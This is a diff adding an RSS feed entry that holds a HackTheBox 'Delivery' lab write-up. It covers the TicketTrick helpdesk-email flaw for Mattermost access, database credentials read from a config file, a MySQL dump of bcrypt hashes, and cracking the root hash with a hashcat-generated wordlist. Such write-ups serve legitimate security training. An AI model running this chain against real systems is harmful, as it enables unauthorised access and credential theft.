@@ -8,6 +8,326 @@
     <lastBuildDate>Tue, 25 May 2021 05:36:18 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/mattermost/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>HackTheBox - Delivery</title>
+      <link>https://fahmifj.github.io/hackthebox/delivery/</link>
+      <pubDate>Tue, 25 May 2021 05:36:18 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/delivery/</guid>
+      <description>Exploiting a logic flaw called TicketTrick</description>
+      <content:encoded><![CDATA[<p>Delivery from HackTheBox is all about exploiting a logic flaw called TicketTrick which was discovered by <a href="https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c">Inti De Ceukelaire</a>.</p>
+<p>On this machine, there is a helpdesk ticketing system that gives an unauthenticated user a temporary email with a legitimate company domain. Using that email, I&rsquo;m able to register at Mattermost and gain access to the company private communication channel. The conversation in the channel leaks a set of SSH credentials and a password in which its variant is being used in the system. There is a set of database credentials in the Mattermost configuration file, which can be used to dump the password hash of the root account. After generating a variant of the exposed password with hashcat, I&rsquo;m able to crack the password and obtain root access.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>TicketTrick</li>
+<li>Generating wordlist using hashcat</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
+<li>Nmap - Preinstalled in Kali Linux</li>
+<li><a href="https://hashcat.net/">hashcat</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p><code>nmap</code> full TCP scan discovers three open ports: An SSH on port 22, an HTTP server on port 80, and an unknown service on port 8065</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70» 
+$ nmap -p- --min-rate <span class="m">1000</span> -sV --reason -oA nmap/10-tcp-allport-delivery 10.10.10.222 
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-21 14:58 EDT
+....
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+80/tcp   open  http    syn-ack ttl <span class="m">63</span> nginx 1.14.2
+8065/tcp open  unknown syn-ack ttl <span class="m">63</span>
+<span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8065-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>5/21%Time<span class="o">=</span>60A80336%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>Ge
+SF:nericLines,67,<span class="s2">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
+</span><span class="s2">SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
+</span><span class="s2">SF:20Request&#34;</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,DF3,<span class="s2">&#34;HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\
+</span><span class="s2">....
+</span><span class="s2">
+</span><span class="s2">→ root@kali «delivery» «10.10.14.70» 
+</span><span class="s2"></span>$<span class="s2"> nmap -p22,80,8065 --min-rate 1000 -sC --reason -oA nmap/10-tcp-allport-delivery 10.10.10.222
+</span><span class="s2">Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-21 15:06 EDT
+</span><span class="s2">Nmap scan report for 10.10.10.222
+</span><span class="s2">Host is up, received echo-reply ttl 63 (0.45s latency).
+</span><span class="s2">
+</span><span class="s2">PORT     STATE SERVICE REASON
+</span><span class="s2">22/tcp   open  ssh     syn-ack ttl 63
+</span><span class="s2">| ssh-hostkey: 
+</span><span class="s2">|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
+</span><span class="s2">|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
+</span><span class="s2">|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
+</span><span class="s2">80/tcp   open  http    syn-ack ttl 63
+</span><span class="s2">|_http-title: Welcome
+</span><span class="s2">8065/tcp open  unknown syn-ack ttl 63
+</span></code></pre></div><p>I can clearly see the fingerprint of port 8065 indicate that it&rsquo;s a HTTP server. I can confirm it with <code>curl</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70» 
+$ curl -sI 10.10.10.222:8065
+HTTP/1.1 <span class="m">405</span> Method Not Allowed
+Date: Fri, <span class="m">21</span> May <span class="m">2021</span> 19:09:14 GMT
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>This page is a static website.</p>
+<p><div class="img-container"><img src="imgs/image-20210522022202624.png" alt="image-20210522022202624"  /></div>
+</p>
+<p>The text “HELPDESK” points to <code>http://helpdesk.delivery.htb/ </code>.  Clicking on the &ldquo;CONTACT US&rdquo; flips the homepage to this views:</p>
+<p><div class="img-container"><img src="imgs/image-20210522022535948.png" alt="image-20210522022535948"  /></div>
+</p>
+<p>The text “MatterMost server” points to <code>http://delivery.htb:8065</code>.</p>
+<p>I can use <code>curl</code> and <code>grep</code> command to grab all the links/URL from this page.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70» 
+$ curl -s 10.10.10.222 <span class="p">|</span> grep -Eo <span class="s1">&#39;href=&#34;[^\&#34;]+&#34;&#39;</span> <span class="p">|</span> grep -v <span class="s1">&#39;#&#39;</span>
+<span class="nv">href</span><span class="o">=</span><span class="s2">&#34;assets/css/main.css&#34;</span>
+<span class="nv">href</span><span class="o">=</span><span class="s2">&#34;assets/css/ie9.css&#34;</span>
+<span class="nv">href</span><span class="o">=</span><span class="s2">&#34;assets/css/noscript.css&#34;</span>
+<span class="nv">href</span><span class="o">=</span><span class="s2">&#34;http://helpdesk.delivery.htb&#34;</span>
+<span class="nv">href</span><span class="o">=</span><span class="s2">&#34;http://helpdesk.delivery.htb&#34;</span>
+<span class="nv">href</span><span class="o">=</span><span class="s2">&#34;http://delivery.htb:8065&#34;</span>
+<span class="nv">href</span><span class="o">=</span><span class="s2">&#34;https://html5up.net&#34;</span>
+</code></pre></div><p>I’ll add the newly discovered hostnames to my <code>/etc/hosts</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70» 
+$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.222 delivery.htb helpdesk.delivery.htb&#39;</span> &gt; /etc/hosts
+</code></pre></div><p>Before moving on, we can poke the hostnames and compare their page size to check if this site has different content when we visit it with a hostname.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70» 
+$ curl -s http://10.10.10.222/ <span class="p">|</span> wc -c
+<span class="m">10850</span>
+→ root@kali «delivery» «10.10.14.70» 
+$ curl -s http://delivery.htb/ <span class="p">|</span> wc -c
+<span class="m">10850</span>
+→ root@kali «delivery» «10.10.14.70» 
+$ curl -s http://helpdesk.delivery.htb/ <span class="p">|</span> wc -c
+<span class="m">4933</span>
+</code></pre></div><p>There is only one page that has different in size.</p>
+<p>I did a <code>gobuster</code> scan but find nothing useful in the results, so I&rsquo;ll move to the next prt.</p>
+<h3 id="tcp-80---helpdeskdeliveryhtb">TCP 80 - helpdesk.delivery.htb</h3>
+<p>There is a helpdesk ticketing system here. At the bottom of the page it shows it is powered by <a href="https://osticket.com/">osTicket</a>.</p>
+<p><div class="img-container"><img src="imgs/image-20210522024708233.png" alt="image-20210522024708233"  /></div>
+</p>
+<p>The &ldquo;Open a New Ticket&rdquo; menu.</p>
+<p><div class="img-container"><img src="imgs/image-20210522025616599.png" alt="image-20210522025616599"  /></div>
+</p>
+<p>The &ldquo;Check Ticket Status&rdquo; menu.</p>
+<p><div class="img-container"><img src="imgs/image-20210522025147588.png" alt="image-20210522025147588"  /></div>
+</p>
+<h4 id="open-a-new-ticket">Open a New Ticket</h4>
+<p>According to the message at <code>http://delivery.htb/#contact-us</code>, guest user seems to be allowed to create a ticket here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">For unregistered users, please use our HelpDesk to get in touch with our team. 
+Once you have an @delivery.htb email address, you&#39;ll be able to have access to our MatterMost server.
+</code></pre></div><p>I&rsquo;ll create one.</p>
+<p><div class="img-container"><img src="imgs/image-20210522030005601.png" alt="image-20210522030005601"  /></div>
+</p>
+<p>Once the ticket request is submitted, it notifies that the ticket has been created.</p>
+<p><div class="img-container"><img src="imgs/image-20210522030208711.png" alt="image-20210522030208711"  /></div>
+</p>
+<p>Besides the ticket id, it also gives us a temporary email with domain of <code>delivery.htb</code>, and I&rsquo;ll note that:</p>
+<ul>
+<li>Ticket : 4709941</li>
+<li>Email: <a href="mailto:4709941@delivery.htb">4709941@delivery.htb</a>.</li>
+</ul>
+<p>The created ticket can be accessed/viewed on “Check Ticket Status” menu.</p>
+<p><div class="img-container"><img src="imgs/image-20210522030510810.png" alt="image-20210522030510810"  /></div>
+</p>
+<h3 id="finding-vulnerabilities---exploit-db">Finding vulnerabilities - Exploit-DB</h3>
+<p>The app source code is available on Github: <a href="https://github.com/osTicket/osTicket">https://github.com/osTicket/osTicket</a>. But, it seems I&rsquo;ll need an admin access to find the version.</p>
+<p>You guess it, we can limit the search based on the box release (9 January 2021):</p>
+<p><div class="img-container"><img src="imgs/image-20210522031957741.png" alt="image-20210522031957741"  /></div>
+</p>
+<p>But those exploits mostly XSS that requires a user interaction and there is no indication for that in this box, so let’s move to the next one.</p>
+<h3 id="tcp-8065--mattermost">TCP 8065 — Mattermost</h3>
+<p>There is an instance of Mattermost here and it requires an account.</p>
+<p><div class="img-container"><img src="imgs/image-20210522032634304.png" alt="image-20210522032634304"  /></div>
+</p>
+<p>Sign up is allowed, but the page clearly shows that valid email is required.</p>
+<p><div class="img-container"><img src="imgs/image-20210522032749098.png" alt="image-20210522032749098"  /></div>
+</p>
+<p>And here is why a valid email is required, there is a verification process.</p>
+<p><div class="img-container"><img src="imgs/image-20210522033006957.png" alt="image-20210522033006957"  /></div>
+</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-maildeliverer">Shell as maildeliverer</h3>
+<h4 id="access-to-mattermost-using-tickettrick">Access to Mattermost using TicketTrick</h4>
+<p>The idea of TicketTrick here is to use the temporary email address given by the support ticket system to register on Mattermost.</p>
+<p>For me, the previous email is: <code>4709941@delivery.htb</code>. I’ll use that to register on Mattermost.</p>
+<p><div class="img-container"><img src="imgs/image-20210522034638745.png" alt="image-20210522034638745"  /></div>
+</p>
+<p>The verification is sent to <code>4709941@delivery.htb</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210522034704297.png" alt="image-20210522034704297"  /></div>
+</p>
+<p>Back on helpdesk, I can see the verification link to activate the my previously created Mattermost account.</p>
+<p><div class="img-container"><img src="imgs/image-20210522034915465.png" alt="image-20210522034915465"  /></div>
+</p>
+<p>Visiting <code>http://delivery.htb:8065/do_verify_email?token=eoy11mus8h6m4hctpmwt9qw31cdsfcxzbg7noyc5gzpc6htp9e8mqe55wwewaju9&amp;email=4709941%40delivery.htb</code> redirects back to MatterMost which confirms the email has been verified.</p>
+<p><div class="img-container"><img src="imgs/image-20210522035035109.png" alt="image-20210522035035109"  /></div>
+</p>
+<p>Upon logging in, I&rsquo;m able to join the Internal channel (like server on Discord). There is one channel called internal.</p>
+<p><div class="img-container"><img src="imgs/image-20210522035330637.png" alt="image-20210522035330637"  /></div>
+</p>
+<p>The chats from root contain a set of credentials and a few hints which indicates that they use a variant password of “PleaseSubscribe!”.</p>
+<h4 id="ssh---maildeliverer">SSH - maildeliverer</h4>
+<p>The credentials of maildeliverer works on SSH.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70» 
+$ ssh maildeliverer@delivery.htb
+...
+maildeliverer@delivery.htb<span class="err">&#39;</span>s password: 
+Linux Delivery 4.19.0-13-amd64 <span class="c1">#1 SMP Debian 4.19.160-2 (2020-11-28) x86_64</span>
+
+...
+Last login: Fri May <span class="m">21</span> 14:11:23 <span class="m">2021</span> from 10.10.16.16
+maildeliverer@Delivery:~$ id
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>maildeliverer<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>maildeliverer<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>maildeliverer<span class="o">)</span>
+</code></pre></div><p>The user flag is done here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">maildeliverer@Delivery:~$ ls -l
+total <span class="m">4</span>
+-r-------- <span class="m">1</span> maildeliverer maildeliverer <span class="m">33</span> May <span class="m">21</span> 11:21 user.txt
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="internal-enumeration">Internal Enumeration</h4>
+<p>Enumerating on <code>/opt</code> finds the Mattermost installation folder. The Mattermost config file contains the database credentials.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">maildeliverer@Delivery:/opt/mattermost/config$ cat config.json <span class="p">|</span> grep SqlSetting -A10
+    <span class="s2">&#34;SqlSettings&#34;</span>: <span class="o">{</span>
+        <span class="s2">&#34;DriverName&#34;</span>: <span class="s2">&#34;mysql&#34;</span>,
+        <span class="s2">&#34;DataSource&#34;</span>: <span class="s2">&#34;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&#34;</span>,
+        <span class="s2">&#34;DataSourceReplicas&#34;</span>: <span class="o">[]</span>,
+        <span class="s2">&#34;DataSourceSearchReplicas&#34;</span>: <span class="o">[]</span>,
+        <span class="s2">&#34;MaxIdleConns&#34;</span>: 20,
+        <span class="s2">&#34;ConnMaxLifetimeMilliseconds&#34;</span>: 3600000,
+        <span class="s2">&#34;MaxOpenConns&#34;</span>: 300,
+        <span class="s2">&#34;Trace&#34;</span>: false,
+        <span class="s2">&#34;AtRestEncryptKey&#34;</span>: <span class="s2">&#34;n5uax3d4f919obtsp1pw1k5xetq1enez&#34;</span>,
+        <span class="s2">&#34;QueryTimeout&#34;</span>: 30,
+</code></pre></div><p>The credentials is <code>mmuser:Crack_The_MM_Admin_PW</code>.</p>
+<h4 id="mysql---dump-passwords">MySQL - Dump Passwords</h4>
+<p>With database credentials, I can connect to the MySQL service.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">maildeliverer@Delivery:/opt/mattermost/config$ mysql mattermost -u mmuser -pCrack_The_MM_Admin_PW
+Reading table information <span class="k">for</span> completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
+Your MariaDB connection id is <span class="m">395</span>
+Server version: 10.3.27-MariaDB-0+deb10u1 Debian <span class="m">10</span>
+
+Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.
+
+MariaDB <span class="o">[</span>mattermost<span class="o">]</span>&gt;
+</code></pre></div><p>There is a users table which usually contains something juicy.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">MariaDB <span class="o">[</span>mattermost<span class="o">]</span>&gt; show tables<span class="p">;</span>
++------------------------+
+<span class="p">|</span> Tables_in_mattermost   <span class="p">|</span>
++------------------------+
+...
+<span class="p">|</span> Users                  <span class="p">|</span>
++------------------------+
+<span class="m">46</span> rows in <span class="nb">set</span> <span class="o">(</span>0.001 sec<span class="o">)</span>
+</code></pre></div><p>I can get the columns of the table user by querying <code>describe Users;</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">MariaDB <span class="o">[</span>mattermost<span class="o">]</span>&gt; describe Users<span class="p">;</span>
++--------------------+--------------+------+-----+---------+-------+
+<span class="p">|</span> Field              <span class="p">|</span> Type         <span class="p">|</span> Null <span class="p">|</span> Key <span class="p">|</span> Default <span class="p">|</span> Extra <span class="p">|</span>
++--------------------+--------------+------+-----+---------+-------+
+<span class="p">|</span> Id                 <span class="p">|</span> varchar<span class="o">(</span>26<span class="o">)</span>  <span class="p">|</span> NO   <span class="p">|</span> PRI <span class="p">|</span> NULL    <span class="p">|</span>       <span class="p">|</span>
+<span class="p">|</span> CreateAt           <span class="p">|</span> bigint<span class="o">(</span>20<span class="o">)</span>   <span class="p">|</span> YES  <span class="p">|</span> MUL <span class="p">|</span> NULL    <span class="p">|</span>       <span class="p">|</span>
+<span class="p">|</span> UpdateAt           <span class="p">|</span> bigint<span class="o">(</span>20<span class="o">)</span>   <span class="p">|</span> YES  <span class="p">|</span> MUL <span class="p">|</span> NULL    <span class="p">|</span>       <span class="p">|</span>
+<span class="p">|</span> DeleteAt           <span class="p">|</span> bigint<span class="o">(</span>20<span class="o">)</span>   <span class="p">|</span> YES  <span class="p">|</span> MUL <span class="p">|</span> NULL    <span class="p">|</span>       <span class="p">|</span>
+<span class="p">|</span> Username           <span class="p">|</span> varchar<span class="o">(</span>64<span class="o">)</span>  <span class="p">|</span> YES  <span class="p">|</span> UNI <span class="p">|</span> NULL    <span class="p">|</span>       <span class="p">|</span>
+<span class="p">|</span> Password           <span class="p">|</span> varchar<span class="o">(</span>128<span class="o">)</span> <span class="p">|</span> YES  <span class="p">|</span>     <span class="p">|</span> NULL    <span class="p">|</span>       <span class="p">|</span>
+...
++--------------------+--------------+------+-----+---------+-------+
+<span class="m">25</span> rows in <span class="nb">set</span> <span class="o">(</span>0.001 sec<span class="o">)</span>
+</code></pre></div><p>I&rsquo;ll dump that the username and password columns from the table Users.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">MariaDB <span class="o">[</span>mattermost<span class="o">]</span>&gt; <span class="k">select</span> Username,Password from Users<span class="p">;</span>
++----------------------------------+--------------------------------------------------------------+
+<span class="p">|</span> Username                         <span class="p">|</span> Password                                                     <span class="p">|</span>
++----------------------------------+--------------------------------------------------------------+
+<span class="p">|</span> surveybot                        <span class="p">|</span>                                                              <span class="p">|</span>
+<span class="p">|</span> c3ecacacc7b94f909d04dbfd308a9b93 <span class="p">|</span> <span class="nv">$2</span>a<span class="nv">$10$u5815SIBe2Fq1FZlv9S8I</span>.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK <span class="p">|</span>
+<span class="p">|</span> 5b785171bfb34762a933e127630c4860 <span class="p">|</span> <span class="nv">$2</span>a<span class="nv">$10$3</span>m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G <span class="p">|</span>
+<span class="p">|</span> testmail                         <span class="p">|</span> <span class="nv">$2</span>a<span class="nv">$10$gSBaz3a76sX</span>.ikqynx4E7O2NYn9.q6fcSopTwYP672lJMSbZ6.IQa <span class="p">|</span>
+<span class="p">|</span> <span class="nb">help</span>                             <span class="p">|</span> <span class="nv">$2</span>a<span class="nv">$10$zsb4KbggZbpQi2Wa8W0</span>.C.lHVJxiUBr6cyNFbDbWu11j6JBJrVkpm <span class="p">|</span>
+<span class="p">|</span> root                             <span class="p">|</span> <span class="nv">$2</span>a<span class="nv">$10$VM6EeymRxJ29r8Wjkr8Dtev0O</span>.1STWb4.4ScG.anuu7v0EFJwgjjO <span class="p">|</span>
+<span class="p">|</span> ff0a21fc6fc2488195e16ea854c963ee <span class="p">|</span> <span class="nv">$2</span>a<span class="nv">$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS</span>.Pduq <span class="p">|</span>
+<span class="p">|</span> channelexport                    <span class="p">|</span>                                                              <span class="p">|</span>
+<span class="p">|</span> 9ecfb4be145d47fda0724f697f35ffaf <span class="p">|</span> <span class="nv">$2</span>a<span class="nv">$10$s</span>.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm <span class="p">|</span>
+<span class="p">|</span> aaaa                             <span class="p">|</span> <span class="nv">$2</span>a<span class="nv">$10$yIdqqOXl</span>.5dcWsXk.Doo2ewl.zTFdsDd2F0.c44iWOpGMIgmDTsY6 <span class="p">|</span>
+<span class="p">|</span> iiamf                            <span class="p">|</span> <span class="nv">$2</span>a<span class="nv">$10$esA8d</span>/l5.IKQJIhnl2SeYeeoFaCOE6Z/esUOSuRb.Vqtkf3gvbli6 <span class="p">|</span>
+<span class="p">|</span> iamf                             <span class="p">|</span> <span class="nv">$2</span>a<span class="nv">$10$ZYEM</span>.GLMnAfq8eM.2rs8q.e/q3bHaOVOCvlu7YGhU0rU0Ug4PME9a <span class="p">|</span>
++----------------------------------+--------------------------------------------------------------+
+<span class="m">12</span> rows in <span class="nb">set</span> <span class="o">(</span>0.000 sec<span class="o">)</span>
+
+MariaDB <span class="o">[</span>mattermost<span class="o">]</span>&gt;
+</code></pre></div><p>Those are bcrypt hashes, but let’s prioritize the root hash.</p>
+<h4 id="cracking-the-hash">Cracking the Hash</h4>
+<p>Based on the conversations on Mattermost, there is someone in the system that uses a variant of “PleaseSubscribe!” and they were talking about hashcat rules.</p>
+<p>I remember exactly that Ippsec (the box author) has shown several techniques on how to generate a variant of seasonal passwords on <a href="https://www.youtube.com/watch?v=H9FcE_FMZio&amp;t=730s">Forest</a> .</p>
+<p>Now the idea is instead of generating seasonal passwords, I can try to generate a few variant of &ldquo;PleaseSubscribe!&rdquo; and use them for cracking.</p>
+<p>So, I&rsquo;ll start by calculating the length of “PleaseSubscribe!”.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70»
+$ <span class="nb">echo</span> -n <span class="s1">&#39;PleaseSubsribe!&#39;</span> <span class="p">|</span> wc -c
+<span class="m">15</span>
+</code></pre></div><p>It has length of 15. I&rsquo;ll save the &ldquo;PleaseSubscribe!&rdquo; string to a file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70»
+$ <span class="nb">echo</span> <span class="s1">&#39;PleaseSubscribe!&#39;</span> &gt; IppsecSubscriber
+</code></pre></div><p>Then I’ll feed that file to <code>hashcat</code> to generate some new variant of it using base64 rule, and I&rsquo;ll take out only the string which has a length greater than 15 and pipe the output to a file called <code>custom_wordlist</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">
+→ root@kali «delivery» «10.10.14.70»
+$ hashcat IppsecSubscriber -r /usr/share/hashcat/rules/best64.rule --stdout <span class="p">|</span> awk <span class="s1">&#39;length($0) &gt; 15&#39;</span> &gt; custom_wordlist
+</code></pre></div><p>It produces 46 words.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70»
+$ wc -w custom_wordlist
+<span class="m">46</span> custom_wordlist
+</code></pre></div><p>With that wordlist the hash gets cracked instantly!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\t</span>ools<span class="se">\h</span>ashcat6&gt;hashcat.exe -m <span class="m">3200</span> <span class="s1">&#39;$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO&#39;</span> custom_wordlist --force
+
+....
+<span class="nv">$2</span>a<span class="nv">$10$VM6EeymRxJ29r8Wjkr8Dtev0O</span>.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: bcrypt <span class="nv">$2</span>*$, Blowfish <span class="o">(</span>Unix<span class="o">)</span>
+Hash.Target......: <span class="nv">$2</span>a<span class="nv">$10$VM6EeymRxJ29r8Wjkr8Dtev0O</span>.1STWb4.4ScG.anuu7v...JwgjjO
+Time.Started.....: Mon Mar <span class="m">15</span> 21:36:35 <span class="m">2021</span> <span class="o">(</span><span class="m">1</span> sec<span class="o">)</span>
+Time.Estimated...: Mon Mar <span class="m">15</span> 21:36:36 <span class="m">2021</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
+<span class="o">[</span>....<span class="o">]</span>
+</code></pre></div><p>The recovered password is <code>PleaseSubscribe!21</code>.</p>
+<h4 id="su---root">SU - root</h4>
+<p>That password works on root user.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">maildeliverer@Delivery:~$ su root
+Password: 
+root@Delivery:/home/maildeliverer# id
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div><p>Now I can just grab the root flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@Delivery:/home/maildeliverer# <span class="nb">cd</span> ~
+root@Delivery:~# ls -l
+total <span class="m">16</span>
+-rwxr-x--- <span class="m">1</span> root root  <span class="m">103</span> Dec <span class="m">26</span> 11:26 mail.sh
+-r-------- <span class="m">1</span> root root  <span class="m">382</span> Dec <span class="m">28</span> 07:02 note.txt
+-rw-r----- <span class="m">1</span> root root <span class="m">1499</span> Dec <span class="m">26</span> 10:55 py-smtp.py
+-r-------- <span class="m">1</span> root root   <span class="m">33</span> May <span class="m">21</span> 11:21 root.txt
+root@Delivery:~# cat *.txt
+I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I<span class="s1">&#39;ve seen several times.  The inspiration for the box is here: 
+</span><span class="s1">
+</span><span class="s1">- https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c 
+</span><span class="s1">
+</span><span class="s1">Keep on hacking! And please don&#39;</span>t forget to subscribe to all the security streamers out there.
+
+- ippsec
+a7d68baadc3b3c072c6...&lt;SNIP&gt;...
+</code></pre></div><p>There is also a message from the <a href="https://www.youtube.com/c/ippsec/videos">box’s author</a>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@Delivery:~# cat note.txt
+I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I<span class="s1">&#39;ve seen several times. The inspiration for the box is here:
+</span><span class="s1">
+</span><span class="s1">- https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c
+</span><span class="s1">
+</span><span class="s1">Keep on hacking! And please don&#39;</span>t forget to subscribe to all the security streamers out there.
+</code></pre></div><hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c">https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Delivery</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-delivery/</link>
       <pubDate>Tue, 25 May 2021 05:36:18 +0700</pubDate>
       
